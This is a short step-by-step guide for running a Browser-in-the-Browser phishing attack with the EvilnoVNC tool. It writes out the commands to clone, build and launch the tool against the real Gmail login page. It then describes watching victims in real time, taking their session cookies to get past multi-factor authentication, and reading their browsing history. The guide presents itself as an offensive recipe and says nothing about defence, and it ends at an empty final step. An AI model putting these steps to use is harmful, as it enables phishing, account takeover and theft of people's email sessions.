# Browser-in-the-Browser BitB attack

Tool: EvilnoVNC: https://github.com/JoelGMSec/EvilnoVNC

## Steps

#### 1) Clone the EvilnoVNC tool 

    git clone https://github.com/JoelGMSec/EvilnoVNC

#### 2) Setup tool

    cd EvilnoVNC

To ensure Docker has the proper access to build context files. The ownership of the Downloads directory is first changed to match the containerâ€™s internal user.

    sudo chown -R 103 Downloads

#### 3) Deploy the EvilnoVNC phishing environment as a container

    sudo docker build -t joelgmsec/evilnovnc .

#### 4) Launch EvilnoVNC with Targeted Phishing Page

    sudo chmod +x *

    sudo ./start.sh 1920x1080x24 https://mail.google.com

This step makes all scripts executable. It then launches a virtual desktop inside a Docker container at the specified resolution and opens the real Gmail login page in a browser, exposing it interactively via noVNC over WebSockets.

#### 5) Wait for the victim to fall for our attack! (Our attack even Bypasses MFA)

#### 6) You can check the victim's actions in real-time view by browsing on our localhost.

#### 7) Next, session cookies are extracted from our own browser and imports them into Chromium for full access without needing to phish artifacts, code injections, or traffic proxying.

#### 8) In Chromium, visit

    chrome://history

which shows the victim's browsing history.

#### 9)
